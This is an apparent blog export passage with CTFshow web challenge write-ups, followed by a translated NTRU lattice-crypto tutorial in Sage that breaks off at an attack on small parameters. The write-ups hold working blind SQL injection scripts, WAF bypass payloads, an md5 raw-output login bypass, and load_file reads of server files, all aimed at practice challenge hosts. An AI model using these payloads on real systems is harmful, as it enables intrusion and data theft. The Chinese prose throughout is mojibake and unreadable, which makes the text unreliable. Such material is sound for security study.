(\\d)',resp.content.decode())[0]) if i == '}': exit() break è·‘å®Œå°±å¾—åˆ°flagäº† web 184æŸ¥è¯¢è¯­å¥ 12//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· $sql = &quot;select count(*) from &quot;.$_POST['tableName'].&quot;;&quot;; è¿”å›é€»è¾‘ 1234//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ function waf($str){ return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\&quot;|union|\\`|sleep|benchmark/i', $str); } æŸ¥è¯¢ç»“æœ 12//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•° $user_count = 0; è¿™é¢˜è¿whereéƒ½è¿‡æ»¤æ‰äº†, è¿˜å‰©ä¸‹ä¸€ä¸ªå¯ä»¥ç”¨æ¥è®¾å®šæ¡ä»¶çš„on, å¦‚æœè¦ç”¨onçš„, éœ€è¦ç”¨åˆ°å¤šè¡¨è”åˆæŸ¥è¯¢JOIN, åœ¨ä¸¤ä¸ªè¡¨(ä¾æ—§æ˜¯åŒä¸€ä¸ªè¡¨)ä¸­æŸ¥è¯¢, ç”Ÿæˆçš„ä¸´æ—¶è¡¨ä¸­å°±å¯ä»¥ç”¨on ä¸ç®¡æ˜¯INNER JOINè¿˜æ˜¯LEFT JOINæˆ–è€…æ˜¯RIGHT JOINéƒ½æ— æ‰€è°“, åªéœ€è¦çŒœflagæ­£ç¡®çš„æ—¶å€™å›æ˜¾ä¸åŒå³å¯, å› ä¸ºè¿™é¢˜æ²¡æœ‰è¿‡æ»¤æ‰ç©ºæ ¼, æ„é€ payload:tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str)), å…¶ä¸­numå°±æ˜¯flagçš„ä½æ•°, strå°±æ˜¯çŒœæµ‹çš„å­—ç¬¦ , å› ä¸ºçŸ¥é“flagå‰ç¼€æ˜¯ctfshow{, æ‰€ä»¥ä»ç¬¬9ä½å¼€å§‹çŒœå°±è¡Œäº† 12345678910111213141516171819202122import requestsimport reurl = 'http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': &quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},1)regexp(char({}))&quot;}num = 9flag = 'ctfshow{'while True: for i in Str: Data = { 'tableName': data['tableName'].format(num, ord(i)) } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d*)', resp.content.decode())[0] == '43': flag += i print(flag) if i == '}': exit() num += 1 web 185 186åœ¨184çš„åŸºç¡€ä¸Šè¿‡æ»¤æ‰äº†æ•°å­—, ä¹Ÿå°±æ˜¯è¯´payloadé‡Œé¢ä¸èƒ½å‡ºç°æ•°å­—, å¯ä»¥ç”¨true+true+trueâ€¦.æ¥æ„é€ æƒ³è¦çš„æ•°å­—, å¦‚99å°±æ˜¯99ä¸ªtrueç›¸åŠ , åˆ©ç”¨è¿™ä¸ªç»§ç»­å†™è„šæœ¬å¾—åˆ°flag ä»Y4åšå®¢æ‰¾åˆ°ä¸€å¼ å›¾ 1234567891011121314151617181920212223import requestsimport reurl = 'http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': &quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},true)regexp(char({}))&quot;}num = 9flag = 'ctfshow{'while True: for i in Str: Data = { 'tableName': data['tableName'].format((num*'true+')[:-1], (ord(i)*'true+')[:-1]) } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d*)', resp.content.decode())[0] == '43': flag += i print(flag) if i == '}': exit() num += 1 web 187ä»¥å‰åšè¿‡çš„md5($password,true) å¯ä»¥å»çœ‹çœ‹ jarvis oj - login, ä¸€ä¸ªå¾ˆç¥å¥‡çš„å­—ç¬¦ä¸²ffifdyop 1$sql = &quot;select count(*) from ctfshow_user where username = $_POST['username'] and password= md5($_POST['password'],true)&quot;; md5('ffifdyop',true) = &quot;'or'6xxxxxxx&quot; web 188å…ˆpass , æœ‰ç‚¹å¥‡æ€ª web 189æŸ¥è¯¢è¯­å¥ 12//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql = &quot;select pass from ctfshow_user where username = {$username}&quot;; è¿”å›é€»è¾‘ 12345678910111213141516//ç”¨æˆ·åæ£€æµ‹if(preg_match('/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){ $ret['msg']='ç”¨æˆ·åéæ³•'; die(json_encode($ret));}//å¯†ç æ£€æµ‹if(!is_numeric($password)){ $ret['msg']='å¯†ç åªèƒ½ä¸ºæ•°å­—'; die(json_encode($ret));}//å¯†ç åˆ¤æ–­if($row['pass']==$password){ $ret['msg']='ç™»é™†æˆåŠŸ'; } hint: flagåœ¨api/index.phpæ–‡ä»¶ä¸­ å­¦ä¹ åˆ°äº†ä¸€äº›sqlæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„å‡½æ•°: if(exp1,exp2,exp3), å½“exp1ä¸ºTRUEæ—¶å‡½æ•°è¿”å›exp2, åä¹‹è¿”å›exp3, å¯æ­é…ä¸€äº›å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°æ¥è¿›è¡Œç›²æ³¨ load_file(file_name), è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›, ç”¨äºè¯»å–å¤–éƒ¨æ–‡ä»¶ locate(substr,str), è¿”å›å­—ç¬¦ä¸²strç¬¬ä¸€æ¬¡å‡ºç°å­ä¸²substrçš„ä½ç½® strcmp(str1,str2),å¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰è¿”å›0ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¹æ®å½“å‰çš„æ’åºé¡ºåºæ¯”ç¬¬äºŒè¾ƒå°åˆ™è¿”å›-1ï¼Œå¦åˆ™è¿”å›1 hintå·²ç»å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨æ–‡ä»¶index.phpä¸­, è¦åœ¨sqlä¸­è¯»å–æ–‡ä»¶, å¯ä»¥ä½¿ç”¨load_file(), æ‰€ä»¥è¦åœ¨username ={$username}å¤„æ‰§è¡Œload_file()ä¸”åˆ¤æ–­å‡ºflagæ˜¯å•¥. æ³¨æ„åˆ°$usernameæ²¡æœ‰è¢«å¼•å·åŒ…ç€, æ‰€ä»¥å¦‚æœ$usernameæ˜¯è¯­å¥æ˜¯å¯ä»¥æ‰§è¡Œçš„. è¿™é‡Œè¦ç”¨if()å’Œä¸€äº›å­—ç¬¦ä¸²ä½ å¤„ç†çš„å‡½æ•°æ¥å¯¹flagè¿›è¡Œç›²æ³¨. å½“username=1&amp;password=0æ—¶è¿”å›çš„æ˜¯æŸ¥è¯¢å¤±è´¥è€Œå½“username=0&amp;password=0æ—¶è¿”å›çš„æ˜¯å¯†ç é”™è¯¯, å¯ä»¥æ ¹æ®è¿™ä¸ªå›æ˜¾æ¥å¯¹flagè¿›è¡Œåˆ¤æ–­. é¦–å…ˆ, å…ˆæ‰¾åˆ°flagåœ¨æ–‡ä»¶ä¸­çš„ä½ç½®, å› ä¸ºå‰ç¼€æ˜¯ctfshow{ ,æ‰€ä»¥æ ¹æ®è¿™ä¸ªæ¥æ‰¾åˆ°flagçš„ä½ç½®. 12345678910111213def findindex(): Index = 1 url = 'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/' while True: data = { 'username': &quot;if(locate('ctfshow{',&quot; + &quot;load_file('/var/www/html/api/index.php'))&gt;{},0,1)&quot;.format(Index), 'password': '0' } resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): Index += 1 else: return Index + 8 ç„¶åæ ¹æ®ä¸Šé¢å¾—åˆ°çš„flagçš„èµ·å§‹ä½ç½®å¼€å§‹çŒœflag, æœ€ç»ˆè„šæœ¬ä¸º 123456789101112131415161718192021222324252627282930313233343536import requestsurl = 'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'flag = 'ctfshow{'def findindex(): Index = 1 while True: data = { 'username': &quot;if(locate('ctfshow{',&quot; + &quot;load_file('/var/www/html/api/index.php'))&gt;{},0,1)&quot;.format(Index), 'password': '0' } resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): Index += 1 else: return Index + 8Index = findindex()while True: for i in Str: data = { 'username': &quot;if(strcmp('{}',substr(load_file('/var/www/html/api/index.php'),{},1))=0,0,1)&quot;.format(i, Index), 'password': '0' } resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): flag += i Index += 1 print(flag) if i == '}': exit()","link":"/2020/12/12/CTFshow-Web1000/"},{"title":"Translation of LatticeHacks","text":"æ‰“äº†ä¸ªæ¯”èµ›NTRUä¸ä¼šåš, ç¿»å¯†ç çˆ·çˆ·çš„åšå®¢å‘ç°ä¸€ä¸ªå®è—ç½‘ç«™https://latticehacks.cr.yp.toè™½ç„¶å†…å®¹ä¸å¤š, è¿˜æ˜¯è‹±è¯­çš„. è¿™é‡Œç¿»è¯‘ç¿»è¯‘ä¹Ÿé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹. NTRUå¤šé¡¹å¼Zx.&lt;x&gt; = ZZ[] è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªZxç±», ä¸€ä¸ªZxå¯¹è±¡, ä¸€ä¸ªZxå¯¹è±¡æ˜¯å…³äºxçš„æ•´ç³»æ•°å¤šé¡¹å¼, ä¸¾ä¸ªæ —å­: 123sage : f = Zx([3,1,4])sage : f4*x^2 + x + 3 è¿™ä¸ªå¤šé¡¹å¼fæ˜¯$4x^2,x,3$è¿™ä¸‰éƒ¨åˆ†çš„å’Œ. æ¯ä¸€éƒ¨åˆ†éƒ½æ˜¯æ•´æ•°ç³»æ•°(åˆ†åˆ«ä¸º4,1,3) ä¹˜(times?)ä¸Šä¸€ä¸ª$x$çš„æ¬¡å¹‚(ä¸ºåˆ«ä¸º$x^2,x,1$) ä¹Ÿå¯ä»¥å°†ä¸Šé¢çš„ä¾‹å­å¤åˆ¶é»è´´è¿›Sageæºä»£ç é‡Œ 123f = Zx([3,1,4])f# output: 4*x^2 + x + 3 å¤šé¡¹å¼ä¹˜æ³•Zxç±»æœ‰ä¸€ä¸ªæŠŠæ¯ä¸€éƒ¨åˆ†ç›¸ä¹˜å¹¶ç›¸åŠ çš„å†…ç½®ä¹˜æ³•. æ¯”å¦‚è¯´, $f$ä¹˜ä¸€ä¸ª$x$, æˆ–è€…æ˜¯$x$çš„ä»»æ„æ¬¡æ–¹, ä¸è¿‡è¿™æ ·ä¹Ÿå°±æ˜¯åœ¨ç§»åŠ¨$f$çš„å‚æ•°: 1234f# output: 4*x^2 + x + 3f*x# output: 4*x^3 + x^2 + 3*x å†æ¥ä¸ªä¾‹å­: 12345g = Zx([2,7,1])g# output: x^2 + 7*x + 2f*g# output: 4*x^4 + 29*3^3 + 18*x^2 + 23*x + 6 å¾ªç¯å·ç§¯ é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹å¾ªç¯å·ç§¯æ˜¯æ€æ ·çš„å·ç§¯åˆ†ä¸‰ç§: çº¿æ€§å·ç§¯, å‘¨æœŸå·ç§¯, å¾ªç¯å·ç§¯çº¿æ€§å·ç§¯: å°±æ˜¯æ™®é€šçš„å¤šé¡¹å¼ä¹˜æ³•å¾ªç¯å·ç§¯ä¸å‘¨æœŸå·ç§¯å¹¶æ²¡æœ‰æœ¬è´¨åŒºåˆ«, å¾ªç¯å·ç§¯å°±æ˜¯ä¿ç•™å‰ä¸€éƒ¨åˆ†ä¸åŠ¨, æŠŠåé¢çš„æˆªä¸‹æ¥åŠ åˆ°å‰ä¸€éƒ¨åˆ†å»(å°±æ˜¯æ¨¡$X^n - 1$å§, æ¯”å¦‚æ¨¡$x^3-1$, å¯¹äºç»“æœ$x^4 + x^2 + x + 1 \\mod x^3-1$æ¥è¯´, å°±æ˜¯æŠŠ$x^4$æ¨¡æˆ$x$, å†åŠ åˆ°å‰é¢å»å˜æˆ$x^2 + 2x + 1$) 12def convolution(f,g): return (f * g)% (x^n - 1) è¿™ä¸ªä¹˜æ³•å°±æ˜¯NTRUä¸­ä½¿ç”¨çš„ä¹˜æ³•. å®ƒå°±åƒæ¨¡ä¸€ä¸ª$x^n-1$å¤šé¡¹å¼ä¹˜æ³•. è¿™æ„å‘³ç€æŠŠ$x^n$æ›¿æ¢æˆ1, æŠŠ$x^{(n+1)}$æ›¿æ¢æˆ$x$, æŠŠ$x^{n+2}$æ›¿æ¢æˆ$x^2$ç­‰ç­‰ è¾“å…¥ä¸¤ä¸ªæ¨¡$x^{n-1}$çš„$n$ç³»æ•°å¤šé¡¹å¼$f$å’Œ$g$, é‚£ä¹ˆè¾“å‡ºä¹Ÿä¼šæ˜¯ä¸€ä¸ª$n$æ¬¡å¤šé¡¹å¼, å› ä¸º$n$æ¬¡åŠä»¥ä¸Šçš„å¼å­éƒ½è¢«çº¦æ‰äº†. æ‰€ä»¥æ˜¯æœ‰å¯èƒ½å­˜åœ¨ä¸€äº›ç”šè‡³æ˜¯å…¨éƒ¨é¡¹çš„ç³»æ•°ä¸º0. æˆ‘ä»¬å¸¸è¯´çš„$n$ç³»æ•°å¤šé¡¹å¼å¹¶ä¸æ˜¯è¯´$1, x,â€¦,x^{n-1}$å…¨éƒ½å­˜åœ¨, è€Œæ˜¯è¯´$x^n,x^{n+1}$ ç­‰ç­‰çš„é¡¹ä¸å­˜åœ¨. ä¾‹å­ 12345n = 3f*g# output: 4*x^4 + 29*x^3 + 18*x^2 + 23*x + 6convolution(f,g)# output: 18*x^2 + 27*x + 35 å¦å¤–ä¸€ä¸ªä¾‹å­, è®¡ç®—$f$å’Œ$x$æ¬¡å¹‚çš„å·ç§¯, å°±æ˜¯åœ¨æ—‹è½¬$f$çš„ç³»æ•°. 1234567n = 3f# output: 4*x^2 + x + 3convolution(f,x)# output: x^2 + 3*x + 4convolution(f,x^2)# output: 3*x^2 + 4*x + 1 æ³¨æ„, è¿™é‡Œçš„$n$æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡. åŸæ–‡è¿™é‡Œè¿˜æœ‰ä¸¤ä¸ªç»ƒä¹ , ä¸€ä¸ªæ˜¯pythonç»ƒä¹ , ä¸€ä¸ªæ˜¯æ•°å­¦ç»ƒä¹ â€¦è¿™é‡Œå°±ä¸ç¿»è¯‘äº†, ä¹Ÿæ²¡ä»€ä¹ˆå¿…è¦. Sageå¯ä»¥ç›´æ¥ç”¨R = Zx.quotient(x^n-1)ç”Ÿæˆä¸€ä¸ªåŠ å‡ä¹˜è¿ç®—éƒ½æ˜¯$\\mod x^{n-1} $çš„ç±»R â€œcyclic convolutionâ€(å¾ªç¯å·ç§¯) æˆ–è€…æ˜¯ â€œcircular convolutionâ€ è¿™ä¸ªåå­—æ¥è‡ªä¸ä¿¡å·å¤„ç†. åœ¨å¤šé¡¹å¼ä¹˜æ³•ä¸­, å®ƒå«â€acyclic convolutionâ€ æ¨¡çº¦123def balancedmod(f,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(n)) return Zx(g) balancedmod()æœ‰ä¸¤ä¸ªè¾“å…¥: ä¸€ä¸ª$n$æ•´ç³»æ•°å¤šé¡¹å¼$f$å’Œä¸€ä¸ªæ­£æ•´æ•°$q$. è¾“å‡ºä¸€ä¸ªä¹Ÿæ˜¯næ•´ç³»æ•°, å¹¶ä¸”æ¯ä¸€ä¸ªç³»æ•°éƒ½$\\mod q$. æ•°å­¦å®¶ä»¬é€šå¸¸å®šä¹‰æ¨¡çº¦çš„ç»“æœåœ¨$[0,q-1]$ ä¹‹ä¸­, ä½†è¿™ä¸ªå‡½æ•°çš„è¾“å‡ºä¼šå°†ç³»æ•°æ¨¡çº¦åˆ°$[-q/2,q/2]$ä¹‹é—´, æ›´è¯¦ç»†çš„è¯´, å½“$q$æ˜¯å¶æ•°çš„æ—¶å€™, ç»“æœçš„èŒƒå›´æ˜¯$[-q/2,q/2-1]$;å½“$q$æ˜¯å¥‡æ•°çš„æ—¶å€™, èŒƒå›´æ˜¯$[-(q-1)/2,(q-1)/2]$ æ¥ä¸ªä¾‹å­: 12345678u = Zx([3,1,4,1,5,9])u# output: 9*x^5 + 5*x^4 + x^3 + 4*x^2 + x + 3n = 7balancedmod(u,10)# output: -x^5 - 5*x^4 + x^3 + 4*x^2 + x + 3balancedmod(u,3)# output: -x^4 + x^3 + x^2 + x åœ¨å‡½æ•°å†…éƒ¨, balancedmod()ä¾æ—§ä½¿ç”¨Sageçš„% qæ“ä½œ, è¿™ä¸ªæ“ä½œçš„è¾“å‡ºä¼šåœ¨$[0,q-1]$ä¹‹é—´. ä½†è¿™ä¸ªå‡½æ•°ä¼šè°ƒæ•´è¾“å…¥å’Œè¾“å‡ºåˆ°$q // 2$, ä¹Ÿå°±æ˜¯$q / 2$å–æ•´æ•°éƒ¨åˆ†. æ³¨æ„, è´Ÿæ•°è¾“å…¥% qååœ¨ä½çº§è¯­è¨€ä¸­å¾€å¾€ä¼šè¾“å‡ºè´Ÿæ•°. è¿™æ ·ä¼šæ³„éœ²è¾“å…¥çš„ç¬¦å·(é™¤éè¾“å…¥åˆšå¥½æ˜¯$q$çš„å€æ•°, é‚£ä¹ˆè¾“å‡ºå°±ä¼šæ˜¯0). æ³„éœ²ç¬¦å·å¯ä»¥å¯¼è‡´ä¸€äº›ä¸¥é‡çš„å®‰å…¨é—®é¢˜, Sageæ”¯æŒå¯¹å¤šé¡¹å¼è¿›è¡Œ% pè¿™ä¸ªæ“ä½œ, ä½†æ˜¯è¾“å‡ºæœ‰æ—¶å€™ä¼šæ³„éœ²è¾“å…¥çš„ç¬¦å·, æ¯”å¦‚è¯´: 123456789u = 314 - 159*xu % 200# output: -159*x + 114(u - 400) % 200# output: -159*x - 86(u - 600) % 200# output: -159*x + 114balancedmod(u,200)# output: 41*x - 86 dé¡¹éé›¶çš„éšæœºå¤šé¡¹å¼(Random polynomials with d nonzero coefficients)123456789def randomdpoly(): assert d &lt;= n result = n*[0] for j in range(d): while True: r = randrange(n) if not result[r]: break result[r] = 1 - 2*randrange(2) return Zx(result) randomdpoly()è¿”å›ä¸€ä¸ªæœ‰$d$ä¸ªéé›¶ç³»æ•°($n-d$ä¸ªç³»æ•°ä¸º0)çš„$n$æ¬¡å¤šé¡¹å¼. è€Œä¸”æ¯ä¸ªéé›¶çš„ç³»æ•°è¦ä¹ˆæ˜¯1, è¦ä¹ˆæ˜¯-1. æ¥çœ‹ä¾‹å­(æ³¨æ„nå’Œdæ˜¯å…¨å±€å˜é‡): 12345678n = 7d = 5f = randomdpoly()f# output: x^6 + x^5 - x^3 + x^2 - 1f = randomdpoly()f# output: -x^4 + x^3 + x^2 - x + 1 æ¨¡ç´ æ•°çš„é™¤æ³•123def invertmodprime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f))) litf(), æŠŠä¸€ä¸ªåœ¨ç¯R/Iä¸­çš„æ•°, è½¬æˆåœ¨Rä¸­ invertmodprime()ä¼šè®¡ç®—ä¸€ä¸ªå¤šé¡¹å¼åœ¨$\\mod x^n-1 \\mod p$ä¸‹çš„é€†å…ƒ. è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªè¾“å…¥, ä¸€ä¸ª$n$ç³»æ•°å¤šé¡¹å¼$f$ä»¥åŠä¸€ä¸ªç´ æ•°$p$(æ¯”å¦‚è¯´ 3). è¾“å‡ºä¸€ä¸ª$n$ç³»æ•°å¤šé¡¹å¼$g$, è¿™ä¸ª$g$æ»¡è¶³$f \\cdot g = 1 + p \\cdot u$($f \\cdot g$æ˜¯å¾ªç¯å·ç§¯, $u$ä¹Ÿæ˜¯ä¸€ä¸ªå¤šé¡¹å¼). å¦‚æœå¤šé¡¹å¼$g$ä¸å­˜åœ¨, é‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°†æŠ¥é”™. ä¸¾ä¸ªä¾‹å­: 12345678n = 7f# output: -x^4 + x^3 + x^2 - x + 1f3 = invertmodprime(f,3)f3# output: x^6 + 2*x^4 + xconvolution(f,f3)# output: 3*x^6 - 3*x^5 + 3*x^4 + 1 convolutionçš„ç»“æœå¯ä»¥çœ‹æˆ$1 + 3 \\cdot u$, å…¶ä¸­$u = x^6 - x^5 + x^4$ äº‹å®ä¸Šåœ¨æ¨¡éç´ æ•°çš„æ—¶å€™ä¹Ÿæ˜¯å¯èƒ½ç®—å‡ºç»“æœçš„, ä½†æ˜¯ç”±äºinvertmodprimeä½¿ç”¨äº†Sageä¸­çš„å­ç¨‹åº?(subroutines), ä»¥è‡³äºè¯¥å‡½æ•°ä¼šæ²¡é‚£ä¹ˆå¥½çš„å¤„ç†éç´ æ•°æ¨¡. æ¨¡$2^n$çš„é™¤æ³•1234567def invertmodpowerof2(f,q): assert q.is_power_of(2) g = invertmodprime(f,2) while True: r = balancedmod(convolution(g,f),q) if r == 1: return g g = balancedmod(convolution(g,2 - r),q) è¿™ä¸ªå‡½æ•°è·Ÿä¸Šé¢çš„invertmodprimeå¾ˆåƒ, å”¯ä¸€çš„ä¸åŒæ˜¯è¾“å…¥$q$æ˜¯$2^n$, æ¯”å¦‚$2,4,8,16,â€¦$ 1234567n = 7q = 256f# output: -x^4 + x^3 + x^2 - x + 1fq = invertmodpowerof2(f,q)convolution(f,fq)# output: -256*x^6 + 256*x^4 - 256*x ^2 + 257 convolutionçš„ç»“æœå¯ä»¥çœ‹æˆ$1 + 256 \\cdot u$, å…¶ä¸­$u = x^6 + x^4 - x^2 + 1$ è¿™é‡Œä¾æ—§æœ‰ä¸ªæ•°å­¦ç»ƒä¹  NTRU å¯†é’¥ç”Ÿæˆ12345678910111213def keypair(): while True: try: f = randomdpoly() f3 = invertmodprime(f,3) fq = invertmodpowerof(f,q) break except: pass g = randomdpoly() publickey = balancedmod(3 * convolution(fq,g),q) secretkey = f,f3 return publickey,secretkey keypair()ä¼šç”Ÿæˆä¸€ä¸ªå…¬é’¥hå’Œå¯¹åº”çš„ç§é’¥f,f3. å…¬é’¥çœ‹èµ·æ¥å°±åƒä¸€ä¸ªéšæœºçš„$\\mod q$çš„$n$ç³»æ•°å¤šé¡¹å¼. æ¯”å¦‚è¯´, å¦‚æœ$n = 7, q = 256$, é‚£ä¹ˆå…¬é’¥çœ‹èµ·æ¥å°±åƒä¸€ä¸ª7ä¸ªéšæœºçš„å­—èŠ‚?(bytes): 123456n = 7d = 5q = 256publickey, secretkey = keypair()publickey# output: 54*x^6 - 40*x^5 + 90*x^4 + 101*x^3 - 108*x^2 + 80*x + 76 å…¶ä¸­ä¸€ä¸ªç§é’¥$f$æ˜¯ä¸€ä¸ªæœ‰å°ç³»æ•°çš„å¤šé¡¹å¼, å°†$f$ä¸å…¬é’¥$h$å·ç§¯å†$\\mod q$èƒ½ç”Ÿæˆå¦å¤–ä¸€ä¸ªå°ç³»æ•°çš„å¤šé¡¹å¼, ä¹Ÿå°±æ˜¯å‡ºç°åœ¨å¯†é’¥ç”Ÿæˆé‡Œçš„$3 \\cdot g$ 1234567f,f3 = secretkeyf# output:-x^6 + x^5 - x^4 + x^2 + 1convolution(f, publickey)# output: 256*x^6 + 3*x^5 - 3*x^3 - 3*x^2 + 253*x - 253balancedmod(_,q)# output: 3*x^5 - 3*x^3 - 3*x^2 - 3*x + 3 ç”¨äºåŠ å¯†çš„æ¶ˆæ¯123def randommessage(): result = list(randrange(3) - 1 for j in range(n)) return Zx(result) è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ª$n$ä¸ªç³»æ•°ä¸º$\\{1,0,-1\\}$çš„å¤šé¡¹å¼ 123456789n = 7randommessage()# output: -x^6 - x^5 + x^4randommessage()# output: x^6 + x^5 - x^4 - 1randommessage()# output: -x^4 - x^3 - x + 1randommessage()# output: -x^6 + x^4 - x^2 + 1 åŠ å¯†123def encrypt(message,publickey): r = randomdpoly() return balancedmod(convolution(publickey,r) + message,q) åŠ å¯†å‡½æ•°è¾“å…¥ä¸€ä¸ªéœ€è¦åŠ å¯†çš„æ¶ˆæ¯å’Œå…¬é’¥$h$, è¾“å‡ºçš„å¯†æ–‡ä¸º$h \\cdot r + m \\mod x^{n - 1} \\mod q$,å…¶ä¸­$m$æ˜¯æ¶ˆæ¯, $r$æ˜¯éšæœºçš„ä¸€ä¸ªå¤šé¡¹å¼. ä¾‹å­: 123456789101112n = 7d = 5q = 256h,secretkey = keypair()h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5m = randommessage()m# output: -x^6 - x^4 + x^2 + 1c = encrypt(m,h)c# output: -66*x^6 + 37*x^5 + 115*x^4 - 15*x^3 - 6*x^2 - 89*x + 27 è§£å¯†1234def decrypt(ciphertext,secretkey): f,f3 = secretkey a = balancedmod(convolution(ciphertext,f),q) return balancedmod(convolution(a,f3),3) è§£å¯†å‡½æ•°éœ€è¦è¾“å…¥å¯†æ–‡å’Œç§é’¥ è¿™é‡Œä½œè€…æµ‹è¯•äº†ä¸€ä¸‹è§£å¯†ç®—æ³•, å°±çŸ¥è¯†ç®€å•çš„é‡å¤åŠ å®Œå¯†å†è§£å¯†, è¿™éƒ¨åˆ†å°±ä¸å†™ä¸‹æ¥äº†. ä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯åŠ è§£å¯†çš„æ—¶å€™å‡½æ•°å†…éƒ¨çš„æ‰€æœ‰è¿‡ç¨‹, ç”¨æ¥è¯´æ˜è§£å¯†çš„æ­£ç¡®æ€§: 123456789101112131415161718192021222324252627282930n = 7d = 5q = 256h,secretkey = keypair()h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5m = randommessage()m# output: x^6 + x^5 - x^4 - x^3 + x - 1r = randomdpoly()r# output: -x^6 + x^5 + x^4 + x^3 - x^2f = secretkey[0]f# output: -x^6 - x^5 - x^4 - x^3 - xg3 = balancedmod(convolution(f,h),q)g3# output: -3*x^6 - 3*x^3 + 3*x^2 - 3*x - 3c = balancedmod(convolution(h,r) + m,q)c# output: -93*x^6 - 105*x^5 - 110*x^4 - 95*x^3 - 106*x^2 a = balancedmod(convolution(f,c),q)a# output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3convolution(g3,r) + convolution(f,m)# output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3balancedmod(a,3)# output: -x^4 - x^2 - xbalancedmod(convolution(f,m),3)# output: -x^4 - x^2 - x å†çœ‹çœ‹è¿‡ç¨‹,$$c = h \\cdot r + m \\mod q \\\\f \\cdot h = 3 \\cdot g \\mod q$$æ‰€ä»¥æˆ‘ä»¬æœ‰:$$a = f \\cdot c = f \\cdot h \\cdot r + f \\cdot m = 3 \\cdot g \\cdot r + f \\cdot m \\mod q$$å¤šé¡¹å¼$g,r,f,m$çš„ç³»æ•°éƒ½ç‰¹åˆ«çš„å°, æ‰€ä»¥è¿™é‡Œå¯¹$3 \\cdot g \\cdot r + f \\cdot m$ç³»æ•°çš„æœ€å¤§å€¼æœ‰é™åˆ¶. åªæœ‰å½“è¿™ä¸ªé™åˆ¶è¶³å¤Ÿå°, å°åˆ°$a \\mod q$å°±æ˜¯$3 \\cdot g \\cdot r + f \\cdot m$, è¿™ä¸ªæ—¶å€™$\\mod 3$è§„çº¦$a$å°±æ˜¯åœ¨è®¡ç®—$f \\cdot m \\mod 3$, æœ€åå†ä¹˜$f3$å°±èƒ½å¾—åˆ°$m \\mod 3$äº† æ³¨æ„åˆ°è§£å¯†æ˜¯æœ‰å¯èƒ½å¤±è´¥çš„, æœ‰ä¸€ä¸ªåŠæ³•é¿å…å¯¹æœ‰æ•ˆå¯†æ–‡çš„è§£å¯†å¤±è´¥å°±æ˜¯æ ‡å‡†åŒ–$n,d,q$çš„é€‰å–, ä½†æ˜¯æ”»å‡»è€…ä»ç„¶å¯ä»¥æ•…æ„é€‰æ‹©æ— æ•ˆå¯†æ–‡æ¥æŸ¥çœ‹è§£å¯†æ˜¯å¦å¯ä»¥æ­£å¸¸è¿›è¡Œ. æ‰€ä»¥ä¸ºäº†å®‰å…¨é‡‡å–é¢å¤–çš„æªæ–½æŠµæŠ—è¿™ç§é€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯å¾ˆé‡è¦çš„! ä¸€ä¸ªå¯¹å‚æ•°è¿‡å°çš„NTRUçš„æ”»å‡»å®ä¾‹åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­, å‚æ•°å°†ä½¿ç”¨$n = 7,d = 5,q = 256$ æ”»å‡»è€…å°†ä¼šä»å…¬é’¥$h = 3 \\cdot g / f$å…¥æ‰‹. æˆ‘ä»¬å¯ä»¥è®¡ç®—$h3 = g / f$ 12345h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5Integers(q)(1/3)# output: 